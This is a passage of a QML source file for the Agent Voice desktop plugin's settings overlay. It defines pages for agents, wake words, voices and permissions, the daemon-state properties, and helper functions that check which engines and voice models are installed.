import Quickshell
import Quickshell.Io
import Quickshell.Wayland
import QtQuick
import QtQuick.Controls as QQC
import qs.Commons
// Namespaced as well: on Qt 6.12 a bare `Color` resolves to QtQuick's own
// value-type helper, not to the theme, and every colour read through it was
// undefined. Omarchy's own QML writes Commons.Color for the same reason.
import qs.Commons as Commons
import qs.Ui
import "ui"
import "pages"

// Agent Voice settings, as a themed overlay.
//
// The bar panel is for glancing at state and the few switches you flip
// often; this is for everything else. It used to be one 560px scrolling page
// of twelve boxes in no particular order -- agent settings in three of them,
// the wake word in four -- and the complaint was the obvious one: settings
// scattered and disconnected. Now a sidebar of pages, each holding one
// subject, in pages/*.qml:
//
//   Overview      what is happening, and anything that needs fixing
//   Agents        every agent as the same card, main one included
//   Agent details one agent's folder: role, personality, instructions,
//                 what it is told, its chats
//   Communal      the rules and defaults every agent is told
//   Crew map      who may reach whom, and quarantine
//   Chats         saved conversations and this session's, and what is kept
//   Listening     wake word, engine, microphone gate, verifier
//   Conversation  follow-ups, timings, talking over it
//   Voice         speech out, transcription
//   Display       the readout, privacy, keys
//   About         version, engine status, repair and removal
//
// This file holds what every page shares: the settings store, the daemon's
// state, what is on disk, and the functions that launch things. A page gets
// it all as `s`. It is also the permission prompt, because the plugin has
// one overlay entry point and the summon payload picks. The conversation
// view was a second mode here, behind a "Conversation" button on the top
// row, until phase M18 made it the Chats page.
//
// Every value persists through `omarchy bar set duaneoca.agentvoice <key>`
// (ui/SettingsStore), which writes the widget's entry in shell.json -- the
// same file the daemon watches, so a change lands on the next utterance
// without a restart.
Item {
  id: root

  property var shell: null
  property var manifest: null
  property bool opened: false

  // "settings" or "permission". The summon payload picks; an old payload's
  // "history" opens the Chats page (phase M18).
  property string mode: "settings"
  // Which settings page, and which agent's card to open on the Agents page.
  property string page: "overview"
  property string focusAgent: ""
  // With focusAgent: mark that agent's Tools card (Phase 13; a card since M5).
  property bool focusTools: false
  // The agent and tab Agent details shows, kept for the session so leaving
  // the page and coming back finds them where they were.
  property string detailsAgent: "main"
  property string detailsTab: "prompt"
  // Communal's tab (Phases 13, 14): "rules", "skills" or "notes".
  property string communalTab: "rules"
  property var request: ({})
  property int secondsLeft: 0
  // True once a verdict has been sent for the request on screen, so
  // closing the card does not send a second one.
  property bool answered: false
  // Phase M7: an allow goes to the daemon, which checks where it came from
  // and may refuse it. The card stays up until it says, so a refusal is
  // seen rather than an Allow that silently became a no.
  property string answerFor: ""
  // Which summons the card on screen belongs to (see open()).
  property int probeSeq: 0
  property string answerVerdict: ""
  property string answerNote: ""
  property bool answerFailed: false

  // Shares the [menu] surface tokens, so themes that style the menu style
  // this too.
  property color background: Commons.Color.menu.background
  property color foreground: Commons.Color.menu.text
  property color borderColor: Commons.Color.menu.border
  property var borderSpec: Border.surfaceSpec("menu", "border", borderColor, Math.max(1, Style.space(2)))
  property color scrim: Commons.Color.menu.scrim
  property color accent: Commons.Color.accent
  property color urgent: Commons.Color.urgent
  // Translucent rather than Qt.darker: darker is dimmer only on a dark
  // theme, and on a light one made every hint as black as the label.
  readonly property color dim: Qt.rgba(foreground.r, foreground.g, foreground.b, 0.6)
  readonly property color faint: Qt.rgba(foreground.r, foreground.g, foreground.b, 0.18)
  property string fontFamily: Style.font.menuFamily

  readonly property var pages: [
    { id: "overview",     label: "Overview",     icon: "\u{f0570}", badge: problems.length > 0 ? String(problems.length) : "" },
    { id: "agents",       label: "Agents",       icon: "\u{f06a9}", badge: agentProblems > 0 ? "!" : "" },
    { id: "agentdetails", label: "Agent details", icon: "\u{f0219}", badge: changedOutside("agents") > 0 ? "!" : "" },
    { id: "communal",     label: "Communal",     icon: "\u{f0849}", badge: changedOutside("communal") > 0 ? "!" : "" },
    { id: "crew",         label: "Crew map",     icon: "\u{f0b58}", badge: crewUnreadable || crewOutsideAt !== "" ? "!" : "" },
    { id: "chats",        label: "Chats",        icon: "\u{f0822}" },
    { id: "listening",    label: "Listening",    icon: "\u{f036c}" },
    { id: "conversation", label: "Conversation", icon: "\u{f0b79}" },
    { id: "voice",        label: "Voice",        icon: "\u{f057e}" },
    { id: "display",      label: "Display",      icon: "\u{f0379}" },
    { id: "about",        label: "About",        icon: "\u{f02fd}" }
  ]

  // --- settings ---------------------------------------------------------------
  // An overlay is not a bar widget, so it has no `settings` property injected.
  // The store reads shell.json itself, shows a change the moment it is made,
  // and writes one at a time; see ui/SettingsStore.
  SettingsStore {
    id: store
    defaults: root.defaults
  }
  readonly property alias store: store

  // Adding, removing and restoring agent folders, for every page that does
  // it; here so an operation and its Undo outlive the page that started it.
  AgentFolders {
    id: folders
    s: root
  }
  readonly property alias folders: folders
  readonly property var cfg: store.view

  // The manifest's defaults, for the "reset" links. Read from the file rather
  // than from `manifest`, which the shell does not always pass.
  property var defaults: ({})
  property string version: ""
  FileView {
    path: String(Qt.resolvedUrl("manifest.json")).replace(/^file:\/\//, "")
    printErrors: false
    onLoaded: {
      try {
        var m = JSON.parse(text())
        root.defaults = (m.barWidget && m.barWidget.defaults) || {}
        root.version = String(m.version || "")
      } catch (e) {}
    }
  }

  function setting(key, fallback) { return store.get(key, fallback) }
  function put(key, value) { store.set(key, value) }
  function changed(key) { return !store.isDefault(key) }
  function resetKey(key) { store.reset(key) }

  readonly property var phraseOptions: [
    "hey computer", "okay computer", "hey agent", "hey claude", "okay claude",
    "hey assistant", "hey jarvis", "hey machine", "computer"
  ]
  // The four that ship in the wheel, plus anything the user has trained into
  // ~/.local/share/agentvoice/wakewords/. A custom model is the only way to
  // get a phrase openWakeWord was not shipped with.
  property var customModels: []
  readonly property var owwOptions: [
    { label: "hey jarvis",  value: "hey_jarvis" },
    { label: "alexa",       value: "alexa" },
    { label: "hey mycroft", value: "hey_mycroft" },
    { label: "hey marvin",  value: "hey_marvin" }
  ].concat(customModels)
  // Whether openWakeWord is in the environment at all. install.sh does not
  // install it unless asked (--oww): the default engine is Vosk and the daemon
  // falls back to it if openWakeWord is chosen and missing. That fallback is
  // silent from here, though, so the settings would offer an engine that
  // cannot run and then show its model picker, threshold and verifier while
  // Vosk was actually listening.
  property bool owwAvailable: true
  Process {
    id: scanOww
    command: ["bash", "-c",
      "d=\"${XDG_DATA_HOME:-$HOME/.local/share}/agentvoice/venv\"; " +
      "compgen -G \"$d/lib/python*/site-packages/openwakeword\" >/dev/null " +
      "&& echo yes || echo no"]
    stdout: StdioCollector {
      onStreamFinished: root.owwAvailable = String(text).trim() === "yes"
    }
  }

  // The same question for sherpa-onnx, which needs two things: the package
  // and its model folder (install.sh --sherpa fetches both). Either missing
  // and the daemon falls back to Vosk, so either missing is "not installed".
  property bool sherpaAvailable: true
  Process {
    id: scanSherpa
    command: ["bash", "-c",
      "d=\"${XDG_DATA_HOME:-$HOME/.local/share}/agentvoice\"; " +
      "compgen -G \"$d/venv/lib/python*/site-packages/sherpa_onnx\" >/dev/null " +
      "&& [ -f \"$d/models/sherpa-onnx-kws-zipformer-zh-en-3M-2025-12-20/tokens.txt\" ] " +
      "&& echo yes || echo no"]
    stdout: StdioCollector {
      onStreamFinished: root.sherpaAvailable = String(text).trim() === "yes"
    }
  }

  readonly property var crossCheckOptions: [
    { label: "Both agree", value: "both",
      tooltip: "Vosk and Whisper must hear the same name. Fewest false wakes." },
    { label: "Whisper only", value: "whisper",
      tooltip: "Whisper alone, on every short burst: about a second of CPU each, and Vosk is unloaded." },
    { label: "Vosk only", value: "vosk",
      tooltip: "Cheap, but wakes on sound-alikes such as \"Video\" for Theo." }
  ]
  readonly property var engineOptions: [
    { label: "Vosk", value: "vosk",
      tooltip: "Any phrase, and your other agents' names. Weaker at rejecting sound-alikes." },
    { label: root.owwAvailable ? "openWakeWord" : "openWakeWord (not installed)",
      value: "openwakeword",
      tooltip: "Four phrases, better rejection, and a verifier trained on your voice." },
    { label: root.sherpaAvailable ? "sherpa-onnx" : "sherpa-onnx (not installed)",
      value: "sherpa",
      tooltip: "Any phrase and your other agents' names, with far fewer false wakes than Vosk." }
  ]
  // Which voices are actually on disk. install.sh fetches one by default
  // and the one the settings ask for; the rest are 60MB each and arrive
  // only if chosen. Offering all six without saying which are present let
  // someone pick a voice that does not exist, and the only symptom was
  // silence with the reason in a log.
  property var voicesOnDisk: []
  Process {
    id: scanVoices
    command: ["bash", "-c",
      "d=\"${XDG_DATA_HOME:-$HOME/.local/share}/agentvoice/models/piper\"; " +
      "[ -d \"$d\" ] && for f in \"$d\"/*.onnx; do " +
      "[ -e \"$f\" ] && basename \"$f\" .onnx | sed 's/^en_US-//'; done || true"]
    stdout: StdioCollector {
      onStreamFinished: {
        var out = []
        var lines = String(text).trim().split("\n")
        for (var i = 0; i < lines.length; i++)
          if (lines[i].trim() !== "") out.push(lines[i].trim())
        root.voicesOnDisk = out
      }
    }
  }

  function voiceLabel(label, value) {
    return root.voicesOnDisk.indexOf(value) >= 0 ? label
                                                 : label + "  (not downloaded)"
  }
  function voiceMissing(value) {
    return root.voicesOnDisk.length > 0 && root.voicesOnDisk.indexOf(value) < 0
  }

  // Every single-speaker English voice in the pinned piper-voices revision.
  // American voices are named without their locale, as they always were;
  // British ones carry it ("en_GB-alan-medium"). Each one is in models.lock.
  readonly property var rawVoiceOptions: [
    { label: "Lessac — female, medium", value: "lessac-medium", gender: "female", accent: "US", quality: "medium", mb: 63 },
    { label: "Lessac — female, low", value: "lessac-low", gender: "female", accent: "US", quality: "low", mb: 63 },
    { label: "Lessac — female, high", value: "lessac-high", gender: "female", accent: "US", quality: "high", mb: 118 },
    { label: "Amy — female, medium", value: "amy-medium", gender: "female", accent: "US", quality: "medium", mb: 63 },
    { label: "Amy — female, low", value: "amy-low", gender: "female", accent: "US", quality: "low", mb: 63 },
    { label: "Kristin — female, medium", value: "kristin-medium", gender: "female", accent: "US", quality: "medium", mb: 63 },
    { label: "HFC — female, medium", value: "hfc_female-medium", gender: "female", accent: "US", quality: "medium", mb: 63 },
    { label: "Kathleen — female, low", value: "kathleen-low", gender: "female", accent: "US", quality: "low", mb: 63 },
    { label: "LJ — female, medium", value: "ljspeech-medium", gender: "female", accent: "US", quality: "medium", mb: 63 },
    { label: "LJ — female, high", value: "ljspeech-high", gender: "female", accent: "US", quality: "high", mb: 118 },
    { label: "Ryan — male, medium", value: "ryan-medium", gender: "male", accent: "US", quality: "medium", mb: 63 },
    { label: "Ryan — male, low", value: "ryan-low", gender: "male", accent: "US", quality: "low", mb: 63 },
    { label: "Ryan — male, high", value: "ryan-high", gender: "male", accent: "US", quality: "high", mb: 118 },
    { label: "Joe — male, medium", value: "joe-medium", gender: "male", accent: "US", quality: "medium", mb: 63 },
    { label: "HFC — male, medium", value: "hfc_male-medium", gender: "male", accent: "US", quality: "medium", mb: 63 },
    { label: "Bryce — male, medium", value: "bryce-medium", gender: "male", accent: "US", quality: "medium", mb: 63 },
    { label: "Danny — male, low", value: "danny-low", gender: "male", accent: "US", quality: "low", mb: 63 },
    { label: "John — male, medium", value: "john-medium", gender: "male", accent: "US", quality: "medium", mb: 63 },
    { label: "Kusal — male, medium", value: "kusal-medium", gender: "male", accent: "US", quality: "medium", mb: 63 },
    { label: "Mike — male, medium", value: "mike-medium", gender: "male", accent: "US", quality: "medium", mb: 63 },
    { label: "Norman — male, medium", value: "norman-medium", gender: "male", accent: "US", quality: "medium", mb: 63 },
    { label: "Reza — male, medium", value: "reza_ibrahim-medium", gender: "male", accent: "US", quality: "medium", mb: 63 },
    { label: "Sam — medium", value: "sam-medium", gender: "", accent: "US", quality: "medium", mb: 63 },
    { label: "Alan — male, British, medium", value: "en_GB-alan-medium", gender: "male", accent: "GB", quality: "medium", mb: 63 },
    { label: "Alan — male, British, low", value: "en_GB-alan-low", gender: "male", accent: "GB", quality: "low", mb: 63 },
    { label: "Northern English — male, British, medium", value: "en_GB-northern_english_male-medium", gender: "male", accent: "GB", quality: "medium", mb: 63 },
    { label: "Alba — female, British, medium", value: "en_GB-alba-medium", gender: "female", accent: "GB", quality: "medium", mb: 63 },
    { label: "Cori — female, British, medium", value: "en_GB-cori-medium", gender: "female", accent: "GB", quality: "medium", mb: 63 },
    { label: "Cori — female, British, high", value: "en_GB-cori-high", gender: "female", accent: "GB", quality: "high", mb: 118 },
    { label: "Jenny — female, British, medium", value: "en_GB-jenny_dioco-medium", gender: "female", accent: "GB", quality: "medium", mb: 63 },
    { label: "Southern English — female, British, low", value: "en_GB-southern_english_female-low", gender: "female", accent: "GB", quality: "low", mb: 63 }
  ]

  readonly property var voiceOptions: {
    var out = []
    for (var i = 0; i < root.rawVoiceOptions.length; i++) {
      var v = root.rawVoiceOptions[i]
      out.push({ label: root.voiceLabel(v.label, v.value), value: v.value })
    }
    return out
  }
  function voiceName(value) {
    for (var i = 0; i < root.rawVoiceOptions.length; i++)
      if (root.rawVoiceOptions[i].value === value)
        return root.rawVoiceOptions[i].label.split(" — ")[0]
    return value
  }

  // --- the daemon's state -----------------------------------------------------
  property real levelDb: -99
  // The gate the daemon is using and the room it measured, when the gate
  // follows the room. NaN when there is no reading.
  property real gateDb: NaN
  property real floorDb: NaN
  // What the meters draw as the line: the live gate when it follows the room
  // and the daemon has said what it is, the setting otherwise.
  readonly property real gateInForce: setting("adaptiveGate", false) === true && !isNaN(gateDb)
                                      ? gateDb : setting("micThresholdDb", -38)
  property string vState: "off"
  property string lastTranscript: ""
  property string lastReply: ""
  property string lastWho: ""
  property int lastLatencyMs: 0
  // Published by the daemon, because what a level means depends on what the
  // running agent can honour and only the daemon knows that.
  property string vAgent: ""
  property string permissionLevel: "ask"
  property string vPosture: ""
  // What the running agent can honour. All three until the daemon says
  // otherwise, so the choice is not narrowed to two while the service is off;
  // the daemon then holds an agent that cannot ask read-only, and says so.
  property var agentLevels: ["ask", "edits", "trusted"]
  property bool vRemembers: true
  property string vOverriding: ""
  property bool vGoverned: true
  property bool vVerifier: false
  property bool vTakesModel: false
  // Model choices the daemon read from each program itself -- Codex's own
  // list, which changes with its releases. Keyed by program.
  property var modelLists: ({})
  // The effort levels the running agent takes with its model, lowest first,
  // as the daemon works them out. Empty means no effort control.
  property var vEfforts: []
  property bool vEffortsKnown: false
  // The extra agents as the daemon sees them: per name, the effort levels its
  // model takes, the permission levels its program can honour, and why it
  // cannot be woken or cannot answer, if so.
  property var vCrew: []
  // name -> what that agent is doing ("idle", "thinking", "speaking"), with
  // more than one agent.
  property var vLive: ({})
  // Per agent folder: sizes, problems, files changed outside Settings
  // (merged plan, Phases 9 and 10). Never the text.
  property var vAgentFiles: ({})
  // Tasks between agents, from the state file (collab.py): never a brief.
  property var vTasks: []
  // Turns cut at the longest-turn limit today: {date, today, last}, from
  // the state file (phase M2, bug C). Empty from a daemon that does not say.
  property var vLimitHits: ({})
  // When this run of the service began and how much memory it and, apart,
  // its agents hold: {started_at, rss_mb, agents_mb, agents_procs}, from the
  // state file (master plan M21). Empty from a daemon that does not say.
  property var vService: ({})
  // "Send to another agent" (ui/SendSheet.qml), from the conversation view
  // and a chat row. `fromId` is the source's external id ("main" for the
  // main agent), `chatId` a saved chat or "" for this session.
  // For bench/preview targets, which drive its controls.
  readonly property alias sendSheetView: sendSheet
  // Over whichever settings page it was asked from (phase M18: the Chats
  // page, and the browser on Agent details and Communal).
  function openSendSheet(fromId, chatId) {
    if (root.mode !== "settings") return
    sendSheet.open(fromId, chatId)
  }

  // Omarchy's default agent, read from the file `omarchy default agent`
  // writes, so the main agent has a name while the service is stopped.
  property string defaultAgent: ""
  FileView {
    id: defaultAgentFile
    path: root.configHome + "/omarchy/defaults/agent"
    watchChanges: true
    printErrors: false
    onFileChanged: defaultAgentFile.reload()
    onLoaded: root.defaultAgent = String(text()).trim()
    onLoadFailed: root.defaultAgent = ""
  }
  // What the daemon runs, else what it will run: its own choice, else Omarchy's.
  readonly property string mainAgent: vAgent !== "" ? vAgent
                                      : (String(setting("mainProgram", "")) || defaultAgent)
  readonly property bool usingEndpoint: String(setting("endpointUrl", "")) !== ""
                                        && String(setting("endpointModel", "")) !== ""

  // systemd is the authority on whether the daemon is up; the state file only
  // says what it is doing, and a stale one outlives a crashed daemon.
  property bool serviceActive: false
  property bool serviceBusy: false
  property bool engineInstalled: true
  // Why a switch did nothing, when it did nothing. See CLAUDE.md: a control
  // that does nothing must say why.
  property string note: ""

  Process {
    id: enginePresent
    command: ["bash", "-c", "command -v agentvoice >/dev/null && echo yes || echo no"]
    stdout: StdioCollector {
      onStreamFinished: {
        var found = String(text).trim() === "yes"
        if (found && !root.engineInstalled) root.note = ""
        root.engineInstalled = found
      }
    }
  }
  Process {
    id: activeProbe
    command: ["agentvoice", "is-active"]
    stdout: StdioCollector {
      onStreamFinished: root.serviceActive = String(text).trim() === "yes"
    }
  }
  Timer {
    interval: 2000
    running: root.opened
    repeat: true
    triggeredOnStart: true
    onTriggered: {
      if (!enginePresent.running) enginePresent.running = true
      if (root.engineInstalled) {
        if (!activeProbe.running) activeProbe.running = true
      } else {
        root.serviceActive = false
      }
      // Same recovery as the panel: a first install has no state file to
      // watch, so the watch never attaches and the screen never updates.
      if (root.vState === "off") stateFile.reload()
    }
  }

  // Start or stop the service. The one way in from this screen, so the one
  // guard: no engine, no toggle, and a reason on screen.
  function toggleService() {
    if (!root.engineInstalled) {
      root.note = "The voice engine is not installed yet. Install it from About."
      return
    }
    root.note = ""
    root.serviceBusy = true
    serviceToggle.running = true
  }
  Process {
    id: serviceToggle
    command: ["agentvoice", "toggle"]
    property bool exited: false
    onExited: exited = true
    // `running` going false, not onExited: a spawn that never started emits
    // no exit, and would leave the switch busy for good.
    onRunningChanged: if (!running) {
      root.serviceBusy = false
      if (!exited) root.note = "Could not run `agentvoice`. The engine may have been removed."
      exited = false
      activeProbe.running = true
    }
  }

  // Release or re-engage the microphone, leaving the service warm.
  function toggleMic() {
    if (!root.engineInstalled) {
      root.note = "The voice engine is not installed yet. Install it from About."
      return
    }
    if (!root.serviceActive) return
    root.note = ""
    micToggle.running = true
  }
  Process { id: micToggle; command: ["agentvoice", "mic"] }

  // The readout's preview is not a turn (phase M3).
  property bool vPreview: false
  readonly property bool turnRunning: serviceActive && !vPreview
                                      && (vState === "speaking" || vState === "thinking"
                                          || vState === "transcribing")
  function stopTurn() {
    if (!root.engineInstalled || !root.turnRunning) return
    interrupt.running = true
  }
  Process { id: interrupt; command: ["agentvoice", "interrupt"] }

  // The Display page's Preview (phase M3): four seconds of sample text on
  // the readout, published through the daemon's state file so the HUD draws
  // it exactly as it draws a turn. A button that cannot work says why, here,
  // where the page can show it.
  readonly property string hudPreviewBlocked:
    !root.engineInstalled ? "The voice engine is not installed yet."
    : !root.serviceActive ? "Start Agent Voice first: the preview goes through it."
    : root.setting("hud", true) !== true ? "The readout is switched off."
    : root.vState === "locked" ? "Not while the screen is locked."
    : (root.vState === "listening" || root.vState === "off") ? ""
    : "A turn is under way: the readout is showing the real thing."
  function previewHud() {
    if (root.hudPreviewBlocked !== "") return
    hudPreviewer.running = true
  }
  Process { id: hudPreviewer; command: ["agentvoice", "hud-preview"] }

  // "Test my wake word" on the Listening page. The daemon counts wakes
  // instead of answering them and writes wake-test.json beside the state.
  property var vWakeTest: ({})
  readonly property bool wakeTestRunning: serviceActive && String(vWakeTest.status || "") === "running"
  function wakeTest(start) {
    if (!root.serviceActive) return
    wakeTester.command = ["agentvoice", "wake-test", start ? "start" : "stop"]
    wakeTester.running = true
  }
  Process { id: wakeTester; command: ["agentvoice", "wake-test", "start"] }

  // The automatic test: its own process, wake-auto.json beside the state.
  property var vWakeAuto: ({})
  readonly property bool wakeAutoRunning: ["loading", "running"].indexOf(String(vWakeAuto.status || "")) >= 0
  function wakeTestAuto(start) {
    if (!root.engineInstalled) return
    wakeAutoRunner.command = ["agentvoice", "wake-test", start ? "auto" : "auto-stop"]
    wakeAutoRunner.running = true
  }
  Process { id: wakeAutoRunner; command: ["agentvoice", "wake-test", "auto"] }
  FileView {
    id: wakeAutoFile
    path: (Quickshell.env("XDG_RUNTIME_DIR") || "/run/user/1000") + "/agentvoice/wake-auto.json"
    watchChanges: true
    printErrors: false
    onFileChanged: reload()
    onLoadFailed: root.vWakeAuto = ({})
    onLoaded: {
      try { var d = JSON.parse(text()); root.vWakeAuto = (d && typeof d === "object") ? d : ({}) }
      catch (e) { root.vWakeAuto = ({}) }
    }
  }
  // Both test files are also re-read on a clock while the overlay is open:
  // a watcher set up before a file exists never fires for it, which is why
  // the first live test showed nothing at all.
  Timer {
    interval: 1000
    repeat: true
    running: root.opened
    onTriggered: { wakeTestFile.reload(); wakeAutoFile.reload() }
  }
  FileView {
    id: wakeTestFile
    path: (Quickshell.env("XDG_RUNTIME_DIR") || "/run/user/1000") + "/agentvoice/wake-test.json"
    watchChanges: true
    printErrors: false
    onFileChanged: reload()
    onLoadFailed: root.vWakeTest = ({})
    onLoaded: {
      try { var d = JSON.parse(text()); root.vWakeTest = (d && typeof d === "object") ? d : ({}) }
      catch (e) { root.vWakeTest = ({}) }
    }
  }

  // What the service is doing, in words, for the Overview and the cards.
  readonly property string stateLabel: {
    if (!engineInstalled) return "Not installed"
    if (!serviceActive) return "Off"
    if (vState === "locked") return "Closed while the screen is locked"
    if (vState === "capture") return "Listening to you"
    if (vState === "followup") return "Still listening"
    if (vState === "transcribing") return "Transcribing"
    if (vState === "thinking") return "Thinking"
    if (vState === "speaking") return "Speaking"
    if (vState === "listening") return "Waiting for “" + activePhrase + "”"
    if (vState === "yielded") return "Another app is recording"
    if (vState === "off") return "Microphone off"
    return "Starting"
  }
  readonly property string stateTone: {
    if (!engineInstalled) return "alert"
    if (!serviceActive || vState === "off" || vState === "locked" || vState === "yielded") return "idle"
    if (vState === "capture" || vState === "followup") return "alert"
    if (vState === "listening") return "active"
    return "busy"
  }

  // What one agent is doing, by name. "" is the main agent.
  function agentStatus(name) {
    if (!serviceActive) return "off"
    var live = root.vLive || {}
    // By id; "" is the main agent, which has its own entry with several.
    if (live[name] !== undefined) return String(live[name])
    if (name === "" && (root.lastWho === "" || Object.keys(live).length === 0)) {
      if (vState === "thinking" || vState === "speaking" || vState === "transcribing") return vState
    }
    if (vState === "locked" || vState === "off" || vState === "yielded") return "paused"
    return "idle"
  }
  function statusTone(status) {
    if (status === "thinking" || status === "speaking" || status === "transcribing") return "busy"
    if (status === "off" || status === "paused" || status === "switched off") return "idle"
    return "active"
  }

  // --- more agents ------------------------------------------------------------
  // Each one is woken by its own name and has its own program, model,
  // effort, voice, permission level and folder, and its own conversation.
  // Stored as one list, written whole: `omarchy bar set` replaces a value, so
  // an edit to one field of one agent rewrites the list with that change.
  readonly property int maxAgents: 8
  readonly property var voiceAgents: {
    var v = cfg["voiceAgents"]
    return Array.isArray(v) ? v : []
  }
  readonly property var programOptions: [
    { label: "Claude Code", value: "claude" },
    { label: "Codex", value: "codex" },
    { label: "Gemini", value: "gemini" },
    { label: "Antigravity", value: "agy" },
    { label: "Copilot", value: "copilot" },
    { label: "Endpoint", value: "endpoint" }
  ]
  // Allow is offered only for a card the daemon handed this panel with its
  // one-use nonce (cards.py, phase M7), and only once.
  readonly property bool mayAllow: !answered && request.verified === true &&
                                   /^[0-9a-f]{32}$/.test(String(request.nonce || ""))

  // Who is asking, by name. The hook sends the main agent's name as `label`
  // with no `who`; an extra agent has both.
  function askerName() {
    return String(root.request.label || root.request.who || "")
  }
  // A tool name as words. MCP tools arrive as mcp__<server>__<tool>, which
  // means nothing to someone deciding whether to allow it.
  function toolWords(tool) {
    var t = String(tool || "")
    if (t === "") return "run a tool"
    var m = t.match(/^mcp__(.+?)__(.+)$/)
    if (!m) return "run " + t
    var what = m[2].replace(/_/g, " ")
    if (m[1] === "claude-in-chrome") return "act in your browser (" + what + ")"
    if (m[1] === "agentvoice-desktop") return "use a desktop tool (" + what + ")"
    if (m[1] === "agentvoice-crew") {
      switch (m[2]) {
        case "notes_write":
        case "notes_append": return "write a note"
        case "delegate": return "give another agent a task"
        case "pass_conversation": return "pass this conversation to another agent"
        case "ask_agent": return "ask another agent a question"
        case "message_agent": return "leave another agent a message"
        default: return "use Agent Voice's " + what + " tool"
      }
    }
    return "use " + what + " from " + m[1]
  }

  function programLabel(value) {
    for (var i = 0; i < programOptions.length; i++)
      if (programOptions[i].value === value) return programOptions[i].label
    return value
  }
  // Names that suggest themselves for a new agent, every one a word both
  // Vosk and sherpa-onnx know ("ziggy" was here; sherpa-onnx's lexicon lacks
  // it). The first not already taken is offered.
  readonly property var nameSuggestions: [
    "jarvis", "friday", "atlas", "nova", "sage", "echo", "alfred", "otto",
    "max", "hal"
  ]

  // By id: what the daemon publishes each agent under.
  function crewInfo(id) {
    for (var i = 0; i < root.vCrew.length; i++)
      if (root.vCrew[i] && root.vCrew[i].id === id) return root.vCrew[i]
    return ({})
  }

  // --- names and ids ------------------------------------------------------------
  // Every agent has a Name (any text, what it is called on screen) and a wake
  // phrase (`name` in the saved entry, as it always was), and an `id` that
  // neither changes: grants, saved chats and the Agents panel know it by that.
  // An entry saved before ids existed has none; it gets the one the daemon
  // derives (runtime.agent_id_for), and the page writes it down before the
  // first change, so changing the wake phrase cannot change the id.
  function agentId(a) {
    var raw = typeof (a || {}).id === "string" ? a.id.trim() : ""
    if (/^[a-z0-9][a-z0-9-]{0,47}$/.test(raw) && raw !== "main") return raw
    var slug = String((a || {}).name || "").toLowerCase().replace(/[^a-z0-9]+/g, "-")
                 .replace(/^-+|-+$/g, "").slice(0, 48).replace(/-+$/g, "")
    return slug === "main" ? "agent-main" : slug
  }
  // A fresh id for a new agent: its wake phrase and a few random letters, so
  // an agent deleted and made again under the same name does not inherit
  // the old one's saved chats.
  function newAgentId(name) {
    var base = String(name || "agent").toLowerCase().replace(/[^a-z0-9]+/g, "-")
                 .replace(/^-+|-+$/g, "").slice(0, 40) || "agent"
    var taken = {}
    for (var i = 0; i < voiceAgents.length; i++) taken[agentId(voiceAgents[i])] = true
    for (;;) {
      var id = base + "-" + Math.floor(Math.random() * 46656).toString(36)
      if (!taken[id]) return id
    }
  }
  function capitalised(phrase) {
    return String(phrase || "").split(" ").map(function(w) {
      return w.charAt(0).toUpperCase() + w.slice(1) }).join(" ")
  }
  // As runtime.display_name: one line of at most 40 characters, else the
  // wake phrase capitalised.
  function cleanLabel(text) {
    return String(text || "").replace(/\s+/g, " ").replace(/[\u0000-\u001f\u007f]/g, "").trim().slice(0, 40).trim()
  }
  function agentLabel(a) {
    return cleanLabel((a || {}).label) || capitalised(String((a || {}).name || ""))
  }
  readonly property string mainLabel: cleanLabel(setting("mainName", "")) || capitalised(activePhrase)

  // Each agent's own colour (phase M18: chat bubbles), made from the theme's
  // accent so it follows the theme: the main agent has the accent itself,
  // every other agent the accent turned round the colour wheel by a step its
  // id picks -- by the id, not its place in the list, so an agent keeps its
  // colour when another is added or removed. A grey accent is given enough
  // colour to tell agents apart.
  function agentTint(id) {
    id = String(id || "main")
    if (id === "main") return accent
    var h = 0
    for (var i = 0; i < id.length; i++) h = (h * 31 + id.charCodeAt(i)) % 9973
    var hue = accent.hslHue < 0 ? 0 : accent.hslHue
    return Qt.hsla((hue + (1 + h % 5) / 6) % 1,
                   Math.max(accent.hslSaturation, 0.45),
                   Math.min(0.7, Math.max(0.4, accent.hslLightness)), 1)
  }

  // The model dropdown. Known aliases per agent, then whatever custom name is
  // already saved (so it stays selectable), then "Other…" for typing one.
  // "Other…" is a local UI state, never persisted: picking it only reveals
  // the text box, and the model changes when a name is typed there.
  readonly property var modelPresets: ({
    "claude": [
      { label: "Fable — most capable", value: "fable" },
      { label: "Opus", value: "opus" },
      { label: "Sonnet", value: "sonnet" },
      { label: "Haiku — fastest", value: "haiku" }
    ]
  })
  function agentModelChoices(program, current) {
    var out = [{ label: "Default  (whatever " + (program || "the agent") + " uses on its own)", value: "" }]
    var listed = root.modelLists[program]
    if (!(listed && listed.length) && program === "codex") listed = root.codexModels
    var presets = (listed && listed.length) ? listed : (root.modelPresets[program] || [])
    var known = current === ""
    for (var i = 0; i < presets.length; i++) {
      out.push(presets[i])
      if (presets[i].value === current) known = true
    }
    if (!known) out.push({ label: current + "  (custom)", value: current })
    out.push({ label: "Other…", value: "__other__" })
    return out
  }

  readonly property var effortNames: ({
    "low": "Low", "medium": "Medium", "high": "High",
    "xhigh": "Extra high", "max": "Max", "ultra": "Ultra"
  })
  // Segmented-choice options for an effort list: Default, then each level.
  function effortChoices(efforts) {
    var out = [{ value: "", label: "Default" }]
    for (var i = 0; i < efforts.length; i++) {
      var e = String(efforts[i])
      out.push({ value: e, label: root.effortNames[e] || e })
    }
    return out
  }

  function levelLabel(value, levels) {
    if (value === "trusted") return "Trust everything"
    if (value === "edits") return "Edits are fine"
    return (levels || []).indexOf("edits") >= 0 || !levels ? "Ask first" : "Read-only"
  }
  function levelChoices(levels) {
    var out = []
    var list = levels && levels.length ? levels : ["ask", "edits", "trusted"]
    for (var i = 0; i < list.length; i++) {
      var v = String(list[i])
      out.push({ value: v, label: levelLabel(v, list),
                 tooltip: v === "trusted" ? "Nothing is asked. A spoken sentence can edit files and run commands."
                        : v === "edits" ? "Source files in its folder are edited without asking; commands still ask."
                        : "Every change is asked about on screen." })
    }
    return out
  }

  // The phrase actually being listened for. Both engines keep their own
  // key and the inactive one stays in shell.json, so reading the raw
  // setting would name a phrase nothing is listening for.
  readonly property string activePhrase:
    root.usingOww ? String(root.setting("owwModel", "hey_jarvis")).replace(/_/g, " ")
                  : String(root.setting("phrase", "hey computer"))
  readonly property string projectDir: String(setting("projectDir", ""))

  readonly property string engine: setting("engine", "vosk")
  readonly property bool usingOww: engine === "openwakeword"
  // Selected *and* able to run. The daemon falls back to Vosk when
  // openWakeWord is chosen and not installed, so every control that only
  // makes sense while openWakeWord is really listening keys off this, not
  // off the setting -- otherwise the page describes an engine that is not
  // running.
